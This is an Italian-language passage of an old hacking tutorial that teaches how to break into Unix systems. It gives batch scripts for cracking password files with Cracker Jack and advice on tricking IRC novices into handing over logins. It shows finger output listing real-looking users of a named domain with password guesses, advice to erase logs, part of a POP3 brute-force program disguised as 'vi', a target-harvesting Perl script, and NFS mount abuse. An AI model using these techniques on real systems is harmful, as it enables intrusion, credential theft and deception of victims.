+Puoi trovare la password dell'amministratore nella sezione iniziale del file di 
+password nella directory /etc. Digita: more passwd
+
+Puoi stare certo che i primi due account reali che si trovano nel password file 
+sono degli amministratori. 
+A volte ne puoi trovare altre nelle rispettive directory che sono indicate nel 
+passwd file. 
+Come /staff/username.
+
+Gli History file sono in ciascuna directory di user account. Puoi leggerli per 
+vedere quali sono gli ultimi comandi digitati dall'utente. Qualche volta anche 
+piu' di 100 comandi. Cerca il file .bash_history, o History,puoi leggerli col 
+comando more. more .bash_history, oppure spesso puoi usare more .b* oppure 
+scrivere more .b (e poi premere il tasto TAB sulla tastiera).
+
+Ok, ora ti serve un buon programma per crackare le password. Nel prossimo 
+capitolo scoprirai come ottenere il file di passwd nei sistemi in cui possiedi 
+un account, ma ti serve comunque un programma di cracking delle password!!
+
+Ti servono 3 cose.
+
+1. Programma per il cracking delle password
+2. Un buon word file
+3. Un file di password 
+(N.B. il phile di passwd deve essere il piu' possibile aggiornato, altrimenti 
+rischiate di perdere del tempo con password che sono gia' state cambiate dai 
+proprietari)
+
+Il migliore programma di passwd cracking dovrebbe essere CRACKERJACK (anche John 
+the Ripper funziona davvero bene!) Entrambi possono essere cercati facilmente su 
+Web. Scarica,ad esempio, crackerjack. Se sei un po' piu' esperto puoi scaricare 
+una versione di cjack per unix e lanciarlo in una shell. Ma se stai iniziando, 
+cerca la versione per DOS/OS2.
+
+Cerca anche un buon Word file. I migliori contengono nomi.
+Troverai che le password meno sicure sono i nomi delle ragazze degli utenti o i 
+nomi dei ragazzi delle utenti ;)) Troverai wordfile del tipo 'familynames' 
+'babynames' 'girlsnames' 'boysnames' 'commonpasswords' Hackersdict' e file 
+similari dovrebbero essere una buona scelta.
+
+lancia crackerjack cosi':
+
+[D:\jack]jack
+
+Cracker Jack version 1.4 for OS/2 and DOS (386)
+Copyright (C) 1993, The Jackal, Denmark
+
+PWfile(s) : domain.com.passwd
+
+Wordfile  : domain.com.passwd
+
+Come prima cosa lancia il passwd file come wordfile. Questo ti permettera' di 
+ottenere tutti gli account di chi usa il proprio nome come password,anche se 
+hanno usato altre info come il nome della loro compagnia verra' 
+scoperto subito e non dovrai aspettare la ricerca tramite wordfile.
+
+Se vuoi creare un hash word file per ottenere piu' possibilita',leggi la 
+documentazione di crackerjack.
+
+L'hashing permette a crackerjack di cambiare il case del wordfile o anche di 
+aggiungere numeri e lettere all'inizio o alla fine dele parole nel wordfile, 
+come sandy1 o 1sandy. Scoprirai che molti utenti fanno questo e credono di 
+essere piu' al sicuro.
+
+Puoi trovare qui dei file di hashing sia per i wordfile che per le passwd. Dopo 
+averli analizzati vedrai come poterli modificare o crearne di nuovi a seconda 
+della situazione.
+
+------------ Inizio di discthash.bat
+------------ start of dicthash.bat
+@echo off
+cls
+echo - THIS FILE FOR DOS MACHINES
+echo ----------------------------------------------------------------------
+echo - To work this batch file have all of the crackerjack files in the
+echo - current directory with this batch file, along with your dict and
+echo - password file.  Then use this batch file using the following format:
+echo -
+echo - dicthash.bat dictfilename.ext passwordfilename.ext
+echo -
+echo - Make sure to have the jpp.exe and jsort.exe files in your dir as well.
+echo -
+echo - dicthash will first load jack running the dict file against your
+echo - password file in both cases, then it will add numbers 0-9 both to
+echo - the begining and end of every dict word.  This will take a while,
+echo - so go out for that week vacation!
+echo -
+echo - If you get tired you can 'ctrl c' to the next option or number.
+echo -
+echo - ii@dormroom.pyro.net
+echo -
+echo - Mail me some of your hits, let me know how this works for you ;)
+
+jpp -lower %1 | jack -stdin %2
+jpp %1 | jack -stdin %2
+jpp -dot:0 %1 | jpp -translate:.1 | jack -stdin %2
+jpp -dot:7 %1 | jpp -translate:.1 | jack -stdin %2
+jpp -lower -dot:0 %1 | jpp -translate:.1 | jack -stdin %2
+jpp -lower -dot:7 %1 | jpp -translate:.1 | jack -stdin %2
+jpp  -dot:0 %1 | jpp -translate:.2 | jack -stdin %2
+jpp  -dot:7 %1 | jpp -translate:.2 | jack -stdin %2
+jpp  -lower -dot:0 %1 | jpp -translate:.2 | jack -stdin %2
+jpp  -lower -dot:7 %1 | jpp -translate:.2 | jack -stdin %2
+jpp  -dot:0 %1 | jpp -translate:.3 | jack -stdin %2
+jpp  -dot:7 %1 | jpp -translate:.3 | jack -stdin %2
+jpp  -lower -dot:0 %1 | jpp -translate:.3 | jack -stdin %2
+jpp  -lower -dot:7 %1 | jpp -translate:.3 | jack -stdin %2
+jpp  -dot:0 %1 | jpp -translate:.4 | jack -stdin %2
+jpp  -dot:7 %1 | jpp -translate:.4 | jack -stdin %2
+jpp  -lower -dot:0 %1 | jpp -translate:.4 | jack -stdin %2
+jpp  -lower -dot:7 %1 | jpp -translate:.4 | jack -stdin %2
+jpp  -dot:0 %1 | jpp -translate:.5 | jack -stdin %2
+jpp  -dot:7 %1 | jpp -translate:.5 | jack -stdin %2
+jpp  -lower -dot:0 %1 | jpp -translate:.5 | jack -stdin %2
+jpp  -lower -dot:7 %1 | jpp -translate:.5 | jack -stdin %2
+jpp  -dot:0 %1 | jpp -translate:.6 | jack -stdin %2
+jpp  -dot:7 %1 | jpp -translate:.6 | jack -stdin %2
+jpp  -lower -dot:0 %1 | jpp -translate:.6 | jack -stdin %2
+jpp  -lower -dot:7 %1 | jpp -translate:.6 | jack -stdin %2
+jpp  -dot:0 %1 | jpp -translate:.7 | jack -stdin %2
+jpp  -dot:7 %1 | jpp -translate:.7 | jack -stdin %2
+jpp  -lower -dot:0 %1 | jpp -translate:.7 | jack -stdin %2
+jpp  -lower -dot:7 %1 | jpp -translate:.7 | jack -stdin %2
+jpp  -dot:0 %1 | jpp -translate:.8 | jack -stdin %2
+jpp  -dot:7 %1 | jpp -translate:.8 | jack -stdin %2
+jpp  -lower -dot:0 %1 | jpp -translate:.8 | jack -stdin %2
+jpp  -lower -dot:7 %1 | jpp -translate:.8 | jack -stdin %2
+jpp  -dot:0 %1 | jpp -translate:.9 | jack -stdin %2
+jpp  -dot:7 %1 | jpp -translate:.9 | jack -stdin %2
+jpp  -lower -dot:0 %1 | jpp -translate:.9 | jack -stdin %2
+jpp  -lower -dot:7 %1 | jpp -translate:.9 | jack -stdin %2
+jpp  -dot:0 %1 | jpp -translate:.0 | jack -stdin %2
+jpp  -dot:7 %1 | jpp -translate:.0 | jack -stdin %2
+jpp  -lower -dot:0 %1 | jpp -translate:.0 | jack -stdin %2
+jpp  -lower -dot:7 %1 | jpp -translate:.0 | jack -stdin %2
+
+---------------- fine di dicthash.bat
+
+---------------- inizio di jackhash.bat
+@echo off
+cls
+echo - THIS FILE FOR DOS
+echo ----------------------------------------------------------------------
+echo - To work this batch file have all of the crackerjack files in the
+echo - current directory with this batch file, along with your password file.
+echo - Then use this batch file using the following format:
+echo -
+echo - jackhash.bat passwordfilename.ext
+echo -
+echo - Make sure to have the jpp.exe and jsort.exe files in your dir as well.
+echo -
+echo - jackhash will first load jack running the passwd file against
+echo - itself in both upper and lower cases, then it will add numbers 0-9
+echo - both to the begining and end of every dict word.  This will take
+echo - a while, so go out for that week vacation!
+echo -
+echo - If you get tired you can 'ctrl c' to the next option or number.
+echo -
+echo - ii@dormroom.pyro.net
+echo -
+echo - Mail me some of your hits, let me know how this works for you ;)
+
+jpp -gecos:5 -lower %1 | jack -stdin %1
+jpp -gecos:5 %1 | jack -stdin %1
+jpp -gecos:1 -dot:0 %1 | jpp -translate:.1 | jack -stdin %1
+jpp -gecos:1 -dot:7 %1 | jpp -translate:.1 | jack -stdin %1
+jpp -gecos:1 -lower -dot:0 %1 | jpp -translate:.1 | jack -stdin %1
+jpp -gecos:1 -lower -dot:7 %1 | jpp -translate:.1 | jack -stdin %1
+jpp -gecos:1 -dot:0 %1 | jpp -translate:.2 | jack -stdin %1
+jpp -gecos:1 -dot:7 %1 | jpp -translate:.2 | jack -stdin %1
+jpp -gecos:1 -lower -dot:0 %1 | jpp -translate:.2 | jack -stdin %1
+jpp -gecos:1 -lower -dot:7 %1 | jpp -translate:.2 | jack -stdin %1
+jpp -gecos:1 -dot:0 %1 | jpp -translate:.3 | jack -stdin %1
+jpp -gecos:1 -dot:7 %1 | jpp -translate:.3 | jack -stdin %1
+jpp -gecos:1 -lower -dot:0 %1 | jpp -translate:.3 | jack -stdin %1
+jpp -gecos:1 -lower -dot:7 %1 | jpp -translate:.3 | jack -stdin %1
+jpp -gecos:1 -dot:0 %1 | jpp -translate:.4 | jack -stdin %1
+jpp -gecos:1 -dot:7 %1 | jpp -translate:.4 | jack -stdin %1
+jpp -gecos:1 -lower -dot:0 %1 | jpp -translate:.4 | jack -stdin %1
+jpp -gecos:1 -lower -dot:7 %1 | jpp -translate:.4 | jack -stdin %1
+jpp -gecos:1 -dot:0 %1 | jpp -translate:.5 | jack -stdin %1
+jpp -gecos:1 -dot:7 %1 | jpp -translate:.5 | jack -stdin %1
+jpp -gecos:1 -lower -dot:0 %1 | jpp -translate:.5 | jack -stdin %1
+jpp -gecos:1 -lower -dot:7 %1 | jpp -translate:.5 | jack -stdin %1
+jpp -gecos:1 -dot:0 %1 | jpp -translate:.6 | jack -stdin %1
+jpp -gecos:1 -dot:7 %1 | jpp -translate:.6 | jack -stdin %1
+jpp -gecos:1 -lower -dot:0 %1 | jpp -translate:.6 | jack -stdin %1
+jpp -gecos:1 -lower -dot:7 %1 | jpp -translate:.6 | jack -stdin %1
+jpp -gecos:1 -dot:0 %1 | jpp -translate:.7 | jack -stdin %1
+jpp -gecos:1 -dot:7 %1 | jpp -translate:.7 | jack -stdin %1
+jpp -gecos:1 -lower -dot:0 %1 | jpp -translate:.7 | jack -stdin %1
+jpp -gecos:1 -lower -dot:7 %1 | jpp -translate:.7 | jack -stdin %1
+jpp -gecos:1 -dot:0 %1 | jpp -translate:.8 | jack -stdin %1
+jpp -gecos:1 -dot:7 %1 | jpp -translate:.8 | jack -stdin %1
+jpp -gecos:1 -lower -dot:0 %1 | jpp -translate:.8 | jack -stdin %1
+jpp -gecos:1 -lower -dot:7 %1 | jpp -translate:.8 | jack -stdin %1
+jpp -gecos:1 -dot:0 %1 | jpp -translate:.9 | jack -stdin %1
+jpp -gecos:1 -dot:7 %1 | jpp -translate:.9 | jack -stdin %1
+jpp -gecos:1 -lower -dot:0 %1 | jpp -translate:.9 | jack -stdin %1
+jpp -gecos:1 -lower -dot:7 %1 | jpp -translate:.9 | jack -stdin %1
+jpp -gecos:1 -dot:0 %1 | jpp -translate:.0 | jack -stdin %1
+jpp -gecos:1 -dot:7 %1 | jpp -translate:.0 | jack -stdin %1
+jpp -gecos:1 -lower -dot:0 %1 | jpp -translate:.0 | jack -stdin %1
+jpp -gecos:1 -lower -dot:7 %1 | jpp -translate:.0 | jack -stdin %1
+jpp -gecos:1 -dot:0 %1 | jpp -translate:.` | jack -stdin %1
+jpp -gecos:1 -dot:7 %1 | jpp -translate:.` | jack -stdin %1
+jpp -gecos:1 -lower -dot:0 %1 | jpp -translate:.` | jack -stdin %1
+jpp -gecos:1 -lower -dot:7 %1 | jpp -translate:.` | jack -stdin %1
+jpp -gecos:1 -dot:0 %1 | jpp -translate:.~ | jack -stdin %1
+jpp -gecos:1 -dot:7 %1 | jpp -translate:.~ | jack -stdin %1
+jpp -gecos:1 -lower -dot:0 %1 | jpp -translate:.~ | jack -stdin %1
+jpp -gecos:1 -lower -dot:7 %1 | jpp -translate:.~ | jack -stdin %1
+jpp -gecos:1 -dot:0 %1 | jpp -translate:.! | jack -stdin %1
+jpp -gecos:1 -dot:7 %1 | jpp -translate:.! | jack -stdin %1
+jpp -gecos:1 -lower -dot:0 %1 | jpp -translate:.! | jack -stdin %1
+jpp -gecos:1 -lower -dot:7 %1 | jpp -translate:.! | jack -stdin %1
+jpp -gecos:1 -dot:0 %1 | jpp -translate:.A | jack -stdin %1
+jpp -gecos:1 -dot:7 %1 | jpp -translate:.A | jack -stdin %1
+jpp -gecos:1 -lower -dot:0 %1 | jpp -translate:.A | jack -stdin %1
+jpp -gecos:1 -lower -dot:7 %1 | jpp -translate:.A | jack -stdin %1
+jpp -gecos:1 -dot:0 %1 | jpp -translate:.a | jack -stdin %1
+jpp -gecos:1 -dot:7 %1 | jpp -translate:.a | jack -stdin %1
+jpp -gecos:1 -lower -dot:0 %1 | jpp -translate:.a | jack -stdin %1
+jpp -gecos:1 -lower -dot:7 %1 | jpp -translate:.a | jack -stdin %1
+jpp -gecos:1 -dot:0 %1 | jpp -translate:.q | jack -stdin %1
+jpp -gecos:1 -dot:7 %1 | jpp -translate:.q | jack -stdin %1
+jpp -gecos:1 -lower -dot:0 %1 | jpp -translate:.q | jack -stdin %1
+jpp -gecos:1 -lower -dot:7 %1 | jpp -translate:.q | jack -stdin %1
+
+
+jpp -gecos:2 -dot:0 %1 | jpp -translate:.1 | jack -stdin %1
+jpp -gecos:2 -dot:7 %1 | jpp -translate:.1 | jack -stdin %1
+jpp -gecos:2 -lower -dot:0 %1 | jpp -translate:.1 | jack -stdin %1
+jpp -gecos:2 -lower -dot:7 %1 | jpp -translate:.1 | jack -stdin %1
+jpp -gecos:2 -dot:0 %1 | jpp -translate:.2 | jack -stdin %1
+jpp -gecos:2 -dot:7 %1 | jpp -translate:.2 | jack -stdin %1
+jpp -gecos:2 -lower -dot:0 %1 | jpp -translate:.2 | jack -stdin %1
+jpp -gecos:2 -lower -dot:7 %1 | jpp -translate:.2 | jack -stdin %1
+jpp -gecos:2 -dot:0 %1 | jpp -translate:.3 | jack -stdin %1
+jpp -gecos:2 -dot:7 %1 | jpp -translate:.3 | jack -stdin %1
+jpp -gecos:2 -lower -dot:0 %1 | jpp -translate:.3 | jack -stdin %1
+jpp -gecos:2 -lower -dot:7 %1 | jpp -translate:.3 | jack -stdin %1
+jpp -gecos:2 -dot:0 %1 | jpp -translate:.4 | jack -stdin %1
+jpp -gecos:2 -dot:7 %1 | jpp -translate:.4 | jack -stdin %1
+jpp -gecos:2 -lower -dot:0 %1 | jpp -translate:.4 | jack -stdin %1
+jpp -gecos:2 -lower -dot:7 %1 | jpp -translate:.4 | jack -stdin %1
+jpp -gecos:2 -dot:0 %1 | jpp -translate:.5 | jack -stdin %1
+jpp -gecos:2 -dot:7 %1 | jpp -translate:.5 | jack -stdin %1
+jpp -gecos:2 -lower -dot:0 %1 | jpp -translate:.5 | jack -stdin %1
+jpp -gecos:2 -lower -dot:7 %1 | jpp -translate:.5 | jack -stdin %1
+jpp -gecos:2 -dot:0 %1 | jpp -translate:.6 | jack -stdin %1
+jpp -gecos:2 -dot:7 %1 | jpp -translate:.6 | jack -stdin %1
+jpp -gecos:2 -lower -dot:0 %1 | jpp -translate:.6 | jack -stdin %1
+jpp -gecos:2 -lower -dot:7 %1 | jpp -translate:.6 | jack -stdin %1
+jpp -gecos:2 -dot:0 %1 | jpp -translate:.7 | jack -stdin %1
+jpp -gecos:2 -dot:7 %1 | jpp -translate:.7 | jack -stdin %1
+jpp -gecos:2 -lower -dot:0 %1 | jpp -translate:.7 | jack -stdin %1
+jpp -gecos:2 -lower -dot:7 %1 | jpp -translate:.7 | jack -stdin %1
+jpp -gecos:2 -dot:0 %1 | jpp -translate:.8 | jack -stdin %1
+jpp -gecos:2 -dot:7 %1 | jpp -translate:.8 | jack -stdin %1
+jpp -gecos:2 -lower -dot:0 %1 | jpp -translate:.8 | jack -stdin %1
+jpp -gecos:2 -lower -dot:7 %1 | jpp -translate:.8 | jack -stdin %1
+jpp -gecos:2 -dot:0 %1 | jpp -translate:.9 | jack -stdin %1
+jpp -gecos:2 -dot:7 %1 | jpp -translate:.9 | jack -stdin %1
+jpp -gecos:2 -lower -dot:0 %1 | jpp -translate:.9 | jack -stdin %1
+jpp -gecos:2 -lower -dot:7 %1 | jpp -translate:.9 | jack -stdin %1
+jpp -gecos:2 -dot:0 %1 | jpp -translate:.0 | jack -stdin %1
+jpp -gecos:2 -dot:7 %1 | jpp -translate:.0 | jack -stdin %1
+jpp -gecos:2 -lower -dot:0 %1 | jpp -translate:.0 | jack -stdin %1
+jpp -gecos:2 -lower -dot:7 %1 | jpp -translate:.0 | jack -stdin %1
+
+
+jpp -gecos:4 -dot:0 %1 | jpp -translate:.1 | jack -stdin %1
+jpp -gecos:4 -dot:7 %1 | jpp -translate:.1 | jack -stdin %1
+jpp -gecos:4 -lower -dot:0 %1 | jpp -translate:.1 | jack -stdin %1
+jpp -gecos:4 -lower -dot:7 %1 | jpp -translate:.1 | jack -stdin %1
+jpp -gecos:4 -dot:0 %1 | jpp -translate:.2 | jack -stdin %1
+jpp -gecos:4 -dot:7 %1 | jpp -translate:.2 | jack -stdin %1
+jpp -gecos:4 -lower -dot:0 %1 | jpp -translate:.2 | jack -stdin %1
+jpp -gecos:4 -lower -dot:7 %1 | jpp -translate:.2 | jack -stdin %1
+jpp -gecos:4 -dot:0 %1 | jpp -translate:.3 | jack -stdin %1
+jpp -gecos:4 -dot:7 %1 | jpp -translate:.3 | jack -stdin %1
+jpp -gecos:4 -lower -dot:0 %1 | jpp -translate:.3 | jack -stdin %1
+jpp -gecos:4 -lower -dot:7 %1 | jpp -translate:.3 | jack -stdin %1
+jpp -gecos:4 -dot:0 %1 | jpp -translate:.4 | jack -stdin %1
+jpp -gecos:4 -dot:7 %1 | jpp -translate:.4 | jack -stdin %1
+jpp -gecos:4 -lower -dot:0 %1 | jpp -translate:.4 | jack -stdin %1
+jpp -gecos:4 -lower -dot:7 %1 | jpp -translate:.4 | jack -stdin %1
+jpp -gecos:4 -dot:0 %1 | jpp -translate:.5 | jack -stdin %1
+jpp -gecos:4 -dot:7 %1 | jpp -translate:.5 | jack -stdin %1
+jpp -gecos:4 -lower -dot:0 %1 | jpp -translate:.5 | jack -stdin %1
+jpp -gecos:4 -lower -dot:7 %1 | jpp -translate:.5 | jack -stdin %1
+jpp -gecos:4 -dot:0 %1 | jpp -translate:.6 | jack -stdin %1
+jpp -gecos:4 -dot:7 %1 | jpp -translate:.6 | jack -stdin %1
+jpp -gecos:4 -lower -dot:0 %1 | jpp -translate:.6 | jack -stdin %1
+jpp -gecos:4 -lower -dot:7 %1 | jpp -translate:.6 | jack -stdin %1
+jpp -gecos:4 -dot:0 %1 | jpp -translate:.7 | jack -stdin %1
+jpp -gecos:4 -dot:7 %1 | jpp -translate:.7 | jack -stdin %1
+jpp -gecos:4 -lower -dot:0 %1 | jpp -translate:.7 | jack -stdin %1
+jpp -gecos:4 -lower -dot:7 %1 | jpp -translate:.7 | jack -stdin %1
+jpp -gecos:4 -dot:0 %1 | jpp -translate:.8 | jack -stdin %1
+jpp -gecos:4 -dot:7 %1 | jpp -translate:.8 | jack -stdin %1
+jpp -gecos:4 -lower -dot:0 %1 | jpp -translate:.8 | jack -stdin %1
+jpp -gecos:4 -lower -dot:7 %1 | jpp -translate:.8 | jack -stdin %1
+jpp -gecos:4 -dot:0 %1 | jpp -translate:.9 | jack -stdin %1
+jpp -gecos:4 -dot:7 %1 | jpp -translate:.9 | jack -stdin %1
+jpp -gecos:4 -lower -dot:0 %1 | jpp -translate:.9 | jack -stdin %1
+jpp -gecos:4 -lower -dot:7 %1 | jpp -translate:.9 | jack -stdin %1
+jpp -gecos:4 -dot:0 %1 | jpp -translate:.0 | jack -stdin %1
+jpp -gecos:4 -dot:7 %1 | jpp -translate:.0 | jack -stdin %1
+jpp -gecos:4 -lower -dot:0 %1 | jpp -translate:.0 | jack -stdin %1
+jpp -gecos:4 -lower -dot:7 %1 | jpp -translate:.0 | jack -stdin %1
+
+
+jpp -gecos:8 -dot:0 %1 | jpp -translate:.1 | jack -stdin %1
+jpp -gecos:8 -dot:7 %1 | jpp -translate:.1 | jack -stdin %1
+jpp -gecos:8 -lower -dot:0 %1 | jpp -translate:.1 | jack -stdin %1
+jpp -gecos:8 -lower -dot:7 %1 | jpp -translate:.1 | jack -stdin %1
+jpp -gecos:8 -dot:0 %1 | jpp -translate:.2 | jack -stdin %1
+jpp -gecos:8 -dot:7 %1 | jpp -translate:.2 | jack -stdin %1
+jpp -gecos:8 -lower -dot:0 %1 | jpp -translate:.2 | jack -stdin %1
+jpp -gecos:8 -lower -dot:7 %1 | jpp -translate:.2 | jack -stdin %1
+jpp -gecos:8 -dot:0 %1 | jpp -translate:.3 | jack -stdin %1
+jpp -gecos:8 -dot:7 %1 | jpp -translate:.3 | jack -stdin %1
+jpp -gecos:8 -lower -dot:0 %1 | jpp -translate:.3 | jack -stdin %1
+jpp -gecos:8 -lower -dot:7 %1 | jpp -translate:.3 | jack -stdin %1
+jpp -gecos:8 -dot:0 %1 | jpp -translate:.4 | jack -stdin %1
+jpp -gecos:8 -dot:7 %1 | jpp -translate:.4 | jack -stdin %1
+jpp -gecos:8 -lower -dot:0 %1 | jpp -translate:.4 | jack -stdin %1
+jpp -gecos:8 -lower -dot:7 %1 | jpp -translate:.4 | jack -stdin %1
+jpp -gecos:8 -dot:0 %1 | jpp -translate:.5 | jack -stdin %1
+jpp -gecos:8 -dot:7 %1 | jpp -translate:.5 | jack -stdin %1
+jpp -gecos:8 -lower -dot:0 %1 | jpp -translate:.5 | jack -stdin %1
+jpp -gecos:8 -lower -dot:7 %1 | jpp -translate:.5 | jack -stdin %1
+jpp -gecos:8 -dot:0 %1 | jpp -translate:.6 | jack -stdin %1
+jpp -gecos:8 -dot:7 %1 | jpp -translate:.6 | jack -stdin %1
+jpp -gecos:8 -lower -dot:0 %1 | jpp -translate:.6 | jack -stdin %1
+jpp -gecos:8 -lower -dot:7 %1 | jpp -translate:.6 | jack -stdin %1
+jpp -gecos:8 -dot:0 %1 | jpp -translate:.7 | jack -stdin %1
+jpp -gecos:8 -dot:7 %1 | jpp -translate:.7 | jack -stdin %1
+jpp -gecos:8 -lower -dot:0 %1 | jpp -translate:.7 | jack -stdin %1
+jpp -gecos:8 -lower -dot:7 %1 | jpp -translate:.7 | jack -stdin %1
+jpp -gecos:8 -dot:0 %1 | jpp -translate:.8 | jack -stdin %1
+jpp -gecos:8 -dot:7 %1 | jpp -translate:.8 | jack -stdin %1
+jpp -gecos:8 -lower -dot:0 %1 | jpp -translate:.8 | jack -stdin %1
+jpp -gecos:8 -lower -dot:7 %1 | jpp -translate:.8 | jack -stdin %1
+jpp -gecos:8 -dot:0 %1 | jpp -translate:.9 | jack -stdin %1
+jpp -gecos:8 -dot:7 %1 | jpp -translate:.9 | jack -stdin %1
+jpp -gecos:8 -lower -dot:0 %1 | jpp -translate:.9 | jack -stdin %1
+jpp -gecos:8 -lower -dot:7 %1 | jpp -translate:.9 | jack -stdin %1
+jpp -gecos:8 -dot:0 %1 | jpp -translate:.0 | jack -stdin %1
+jpp -gecos:8 -dot:7 %1 | jpp -translate:.0 | jack -stdin %1
+jpp -gecos:8 -lower -dot:0 %1 | jpp -translate:.0 | jack -stdin %1
+jpp -gecos:8 -lower -dot:7 %1 | jpp -translate:.0 | jack -stdin %1
+
+--------------- fine di jackhash.bat
+
+Puoi ottenere passwd files senza avere un account, vedi il Capitolo 3
+
+------------------------
+Sezione 2B.
+Parlare con i novellini
+------------------------
+
+Ci sono altri modi per ottenere un account senza lavorare molto. Parcheggiati in 
+un canale IRC che hai creato con un titolo riferito all'hacking. Prova anche ad 
+inserirti in altri canali su irc come:
+#hacking #unix #unixhacking #hack #hackers #hacker #virus #virii
+#hackers_hideout ecc.
+
+Ora,cio' che tu cerchi e'un novellino che cerca di imparare o di fare un Exploit 
+sulla shell su cui si trova. 
+C'e'sempre qualcuno che fa domande da novellino e non riceve risposta o viene 
+cacciato via dal canale. Ecco la vostra vittima ;)
+
+/msg alla vittima in modo che gli altri non vedano che stai parlando con lui,e 
+inizia a fargli domande,cerca di aiutarlo ,ma non troppo;) Alla fine digli che 
+puoi collegarti al suo posto. Questo potrebbe essere per recuperare il file di 
+password o chissa' cos'altro. Promettigli il mondo e ottieni la login e la 
+password. 
+Ora hai un inizio e puoi iniziare a metter mano in modo da imparare.  Se trovi 
+l'accesso di root al sistema, non riferirglielo, ma riferiscigli qualche altra 
+informazione in modo da tenerlo occupato mentre sniffi altre password nel 
+sistema. 
+
+Non crediate che io mi comporti davvero cosi'...
+
+Io tendo ad aiutare chi sta imparando e dico la verita' quando affermo di aver 
+trattato onestamente la maggior parte delle persone che ho incontrato.
+
+--------------------
+Sezione 2C.
+La strada difficile
+--------------------
+
+C'e' un altro modo per fare questo. Stai tranquillo che nella maggior parte dei 
+sistemi gli utenti non usano password sicure. Da una shell fai questo:
+
+finger @domainname.com Occhio ,usero' un vero domain:
+
+[10:35am][/home/ii]finger @starnet.net
+[starnet.net]
+Login    Name                 Tty   Idle  Login Time   Office     Office Phone
+chris    Chris Myers           p2   4:46  Jan 27 11:19
+mike     Mike Suter            p1   4:57  Jan 22 16:14
+mike     Mike Suter            p5     3d  Jan 16 15:35
+root     System Administrator  p3   4:59  Jan 16 10:17
+wendt    Catherine Wendt-Bern  p0      3  Jan 21 14:49
+[10:35am][/home/ii]
+
+Potremmo provare ad entrare piu' tardi, prendi nota di queste info:
+
+Login chris Password prova:Chris, chris, myers, Myers, chrismyers, etc...
+
+Questo sembra andar bene, wendt:Catherine:catherine
+
+Ecco un altro comando:
+
+[10:35am][/home/ii]finger -l @starnet.net
+[starnet.net]
+
+
+Login: mike                             Name: Mike Suter
+Directory: /usra/staff/mike             Shell: /bin/csh
+On since Wed Jan 22 16:14 (CST) on ttyp1, idle 5:26, from mikesbox.starnet.net
+On since Thu Jan 16 15:35 (CST) on ttyp5, idle 3 days 22:00, from mikesbox
+Last login Sun Jan 26 23:07 (CST) on ttyp2 from hurk
+No Plan.
+
+Login: root                             Name: System Administrator
+Directory: /root                        Shell: /bin/csh
+On since Thu Jan 16 10:17 (CST) on ttyp3, idle 5:28, from mikesbox.starnet.net
+Last login Thu Jan 16 18:07 (CST) on ttyp6 from mikesbox.starnet.net
+Mail forwarded to:
+\chris@admin.starnet.net
+#\chris@admin.starnet.net, \mike@admin.starnet.net
+No Plan.
+
+Login: wendt                            Name: Catherine Wendt-Bernal
+Directory: /usra/staff/wendt            Shell: /bin/csh
+On since Tue Jan 21 14:49 (CST) on ttyp0, idle 0:02, from veggedout
+No Plan.
+
+Ora hai piu' informazioni su cui lavorare ;)
+
+So che questo puo' stancarti....
+
+Ricorda: questo procedimento fara' il log di tutti i tuoi tentativi,cosi',se 
+trovi la root, cancella i log ;)
+
+Questo e'un piccolo file .c che puoi usare per entrare.
+
+pop3hack.c
+
+----- cut here
+
+#include <stdio.h>
+#include <string.h>
+#include <signal.h>
+#include <unistd.h>
+#include <sys/param.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <stdarg.h>
+
+/* Primo, definisci la porta per POP-3 - quasi sempre 110 */
+#define POP3_PORT               110
+
+/* cosa vogliamo che sembri il nostro programma in modo che l'admin non lo 
+killi*/
+#define MASKAS                  "vi"
+
+/* ripeti il connect o no - ricorda , i logs prenderanno nota della 
+connessione,potresti voler settare questo a 0: in questo modo fara' dell'hack 
+fino a che trova 1 user/password poi esce. se settato a 1, si riconnettera'
+e cerchera' altre user/passwords (finche'ce ne sono ancora) 
+*/
+#define RECONNECT       0
+
+----- cut here
+
+Puoi anche scrivere uno script in perl che faccia finger @ da una domain list e 
+cataloghi le risposte in un file, poi, una volta fatto, provera' a loggarsi con 
+pop3d username-username (o altre info) e mettendo le risposte in un altro file.
+
+Puoi fare ftp a rs.internic.net
+Nella directory del dominio troverai:
+
+com.zone.gz
+edu.zone.gz
+gov.zone.gz
+mil.zone.gz
+net.zone.gz
+org.zone.gz
+
+Scarica questi file e lancia getdomain.pl (lo scipt qui sotto) sui domini che 
+vuoi cercare, in questo modo:
+
+"perl getdomain.pl com.zone com >com.all"
+
+Questo raccogliera' tutti i domini .COM e li mettera' tutti in un file chiamato 
+comm.all.
+
+La stessa cosa puo' essere fatta per i domini .EDU
+
+perl getdomain.pl edu.zone edu >edu.all
+
+Ecco lo script Perl
+
+getdomain.pl
+----cut here
+#!/usr/bin/perl
+
+# GetDomain By Nfin8 / Invisible Evil
+# Questions /msg i-e  or  /msg i^e
+#
+# Retrieve command line arguments.
+my($inputfile, $domain) = @ARGV;
+usage() if (!defined($inputfile) || !defined($domain));
+
+# Open and preprocess the input file.
+open(INFILE, "<$inputfile") or die("Cannot open file $inputfile for 
+reading!\n");
+my(@lines) = <INFILE>;
+
+# Initialize main data structure.
+my(%hash) = {};
+my($key) = "";
+
+foreach (@lines) {
+  $key = (split(/\ /))[0];
+  chop($key);
+  next if ((($key =~ tr/.//) < 1) || 
+            (uc($domain) ne uc(((split(/\./, $key))[-1]))) || 
+            ($key =~ m/root-server/i));
+  $hash{$key}++;
+}
+
+# Close input file and output data structure to STDOUT.
+close(INFILE);
+
+foreach (sort(keys(%hash))) {
+  print "$_\n";
+}
+
+sub usage {
+  print("\n\ngetdomain:\n");
+  print("Usage: getdomain [inputfile] [search]\n\n");
+  print("Where [search] is one of \'com\', \'edu\', \'gov\', \'mil\' or 
+\'net\'.\n\n");
+  exit(0);
+}
+  
+0;
+  
+---- cut here - fine dello script -----
+
+Per usare lo script qui sopra ti basta copiare tra le due linee di delimitazione 
+e chiamarlo getdomain.pl, ora copialo dentro a unix os e digita 
+chmod +x getdomain.pl
+Ora e'pronto per essere lanciato con la linea di comando qui sopra.
+
+------------------------------------------
+Sezione 2D.
+usare Mount per accedere a un sistema unix
+------------------------------------------
+
+Questo non e' difficile e ci sono molti sistemi che sono mountable.
+Mount e'un comando unix che permette di fare mount di drive su macchine remote. 
+Questo e'fatto in modo da poter fare installazione da altre macchine, o solo per 
+condividere drive o directory all'interno la rete. 
+Il problema e' che molti admin sono buoni conoscitori di unix. O forse sono solo 
+un po' fannulloni e fanno il mount dei drive con accesso globale senza capire 
+che chiunque puo' montare i drive e avere accesso in scrittura alle directory 
+degli utenti di quel sistema.
